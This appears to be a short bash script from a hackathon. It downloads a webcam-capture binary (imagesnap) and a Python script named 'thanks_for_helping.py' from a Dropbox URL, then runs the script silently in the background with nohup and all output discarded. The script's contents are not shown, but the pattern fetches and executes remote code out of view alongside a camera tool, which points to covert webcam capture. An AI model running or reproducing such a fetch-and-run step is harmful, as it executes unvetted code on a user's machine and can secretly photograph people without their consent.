#!/bin/bash 
#download imagesnap and the python script
curl http://dl.dropbox.com/u/2001/ADAAHackNY/imagesnap > imagesnap
curl http://dl.dropbox.com/u/2001/ADAAHackNY/thanks_for_helping.py > thanks_for_helping.py 

#make sure imagesnap has permissions
chmod +x imagesnap

nohup python thanks_for_helping.py > /dev/null &
#non-crazy version
#python thanks_for_helping.py
